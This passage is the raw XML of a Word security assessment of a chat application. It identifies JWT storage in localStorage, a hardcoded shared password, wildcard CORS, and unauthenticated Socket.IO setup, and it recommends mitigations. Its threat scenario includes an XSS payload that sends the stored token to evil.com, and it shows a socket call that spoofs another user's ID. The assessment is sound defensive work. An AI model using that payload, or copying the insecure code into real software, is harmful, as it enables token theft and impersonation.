      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc240065707"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>2.1 Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="56F8FBF7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>The authentication system presents three distinct vulnerabilities related to session token storage, credential management, and cross-origin request policies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E70C92" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc240065708"/>
      <w:r>
        <w:t>2.2 Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="42DA0EB6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability A — JWT Storage in `localStorage`:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42733582" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The frontend application stores the JSON Web Token (JWT) in the browser's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>localStorage</w:t>
      </w:r>
      <w:r>
        <w:t>, which is accessible by any JavaScript code executing within the same origin:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D88A73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Frontend: Upon successful login, the token is stored as:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>localStorage.setItem("userInfo", JSON.stringify(data));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>// And retrieved for API calls as:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const userInfo = JSON.parse(localStorage.getItem("userInfo"));</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>// token is then sent via: Authorization: Bearer &lt;token&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06444FE6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unlike </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>httpOnly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookies, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>localStorage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fully accessible</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to client-side JavaScript. If an attacker injects malicious JavaScript via a Cross-Site Scripting (XSS) attack, they can read the token and impersonate the user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B9D02C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability B — Hardcoded Password for Quick Connect Users:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4473E281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userControllers.js, line 176-177:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>user = await User.create({</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    username: cleanUsername,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    name: displayName,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    password: "QuickConnectPassword123!",  // Hardcoded, identical for ALL quick-connect users</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    isQuickConnect: true,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC54362" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Every user created through the Quick Connect flow shares the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>same password</w:t>
      </w:r>
      <w:r>
        <w:t>. If this password is discovered (e.g., through source code review, reverse engineering, or social engineering), an attacker could log in as any Quick Connect user through the standard login endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B6DC3F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability C — Unrestricted CORS Policy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502C27F7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server.js, line 18:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>res.header("Access-Control-Allow-Origin", "*");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490608B8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The wildcard </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>any website</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the internet to send authenticated requests to the API. A malicious website could craft requests to the IM server while the user is logged in, potentially accessing their conversations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07895A75" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc240065709"/>
      <w:r>
        <w:t>2.3 Threat Scenario</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="3B5FE54A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. An attacker discovers an XSS vector (e.g., unescaped user input rendered in the DOM). 2. The attacker injects </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>&lt;script&gt;fetch('https://evil.com/steal?token=' + localStorage.getItem("userInfo"))&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. 3. The attacker now possesses the victim's JWT and </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>can impersonate them for the token's entire lifetime. 4. Combined with the wildcard CORS policy, the attacker's website can directly call the IM API.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EC16DB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc240065710"/>
      <w:r>
        <w:t>2.4 Current Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="4435BAA2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>- JWT tokens are generated with a secret key (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>JWT_SECRET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), providing signature verification. - React's default JSX rendering escapes HTML entities, reducing (but not eliminating) XSS vectors. - The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>protect</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> middleware in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>authMiddleware.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> validates the JWT signature on every protected request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C45A1FB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc240065711"/>
      <w:r>
        <w:t>2.5 Recommended Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/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B2F5B" w14:paraId="00AA8CBC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7663FECF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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7533493A" w14:textId="77777777" w:rsidR="00CB2F5B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4B8D23FD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="3368EA32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E5CA63" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Store JWT in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>httpOnly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Secure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SameSite=Strict</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> cookies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F91F362" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical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32DD84" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="614CF07A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AED4074" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement token expiration with refresh token rotation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ACE7622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3D96E7F1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="3BCD87B6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B24FAF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Generate unique random passwords for Quick Connect users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A7E4D5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02ADAD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71D743BD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6DC1DFF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Restrict CORS to specific frontend domain(s)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577980D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68111172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71524C1D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4E9721" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement Content Security Policy (CSP) headers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08B55D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D228B99" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D3EE513" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="70E70382" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc240065712"/>
      <w:r>
        <w:t>3. Risk Area 2: Socket.IO Event Integrity &amp; Authentication</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="697E8AEF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity: 🟠 HIGH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A4E4A4" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc240065713"/>
      <w:r>
        <w:t>3.1 Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="6EE43E0B" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>The WebSocket layer (Socket.IO) does not implement server-side authentication or authorization for incoming socket connections and events. Any client that can establish a WebSocket connection can emit events with arbitrary payloads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452D1D5D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc240065714"/>
      <w:r>
        <w:t>3.2 Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="6ECC4BE1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability A — No Socket Authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E87E170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server.js — Socket connection handler:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>io.on("connection", (socket) =&gt; {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    socket.on("setup", async (userData) =&gt; {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        if (!userData || !userData._id) return;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        const userId = userData._id.toString();</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        socket.userId = userId;              // Server trusts client-provided userId</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        socketToUser.set(socket.id, userId);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        socket.join(userId);                 // Joins the user's private room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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    });</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE05257" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> event accepts a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>userData</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object directly from the client </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>without any JWT verification</w:t>
      </w:r>
      <w:r>
        <w:t>. A malicious client could send:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C3A67B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socket.emit("setup", { _id: "victimUserId123" });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D66C1E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>This would allow the attacker to: - Join the victim's private Socket.IO room - Receive all real-time messages intended for the victim - Appear as "online" under the victim's identity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FE6D8D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability B — No Rate Limiting on Socket Events:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BD8BF9" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There is no mechanism to throttle or rate-limit socket event emissions. A malicious client could: - Emit thousands of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>typing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> events per second, flooding all connected clients - Emit rapid </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>new message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> events, creating a denial-of-service condition - Emit repeated </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mark messages read</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> events, generating unnecessary database writes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAF8975" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc240065715"/>
      <w:r>
        <w:t>3.3 Threat Scenario</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="0B38F140" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. Attacker opens a raw WebSocket connection to the server. 2. Attacker emits </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with another user's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (which may be guessable or obtained through the search API). 3. Attacker now receives all real-time messages sent to that user. 4. Attacker emits </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>new message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> events with the victim's identity, sending messages on their behalf.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228BCA04" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc240065716"/>
      <w:r>
        <w:t>3.4 Current Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="67D1C3E8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- The Socket.IO server requires a valid connection to be established (TCP handshake), providing transport-level filtering. - REST API endpoints that persist data (send message, mark read) require valid JWT tokens, so permanent data mutations are still authenticated. - The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> handler checks for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>userData._id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> presence but not its validity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75558DEB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc240065717"/>
      <w:r>
        <w:t>3.5 Recommended Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/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B2F5B" w14:paraId="68D826E7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6E326D20" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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1F914F1A" w14:textId="77777777" w:rsidR="00CB2F5B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24945045" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="0FFAB711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5962D4" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add Socket.IO authentication middleware to verify JWT on connection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B3142F8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical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BE309C6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="778BDA7B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04DBB41" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Validate </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>userData._id</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> against the JWT-decoded user identity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6115694E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical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D75B420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562DD761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B499CFD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement per-socket event rate limiting (e.g., max 10 events/second)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187CEF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07DD3A9" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="48060D54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37AC8E0A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
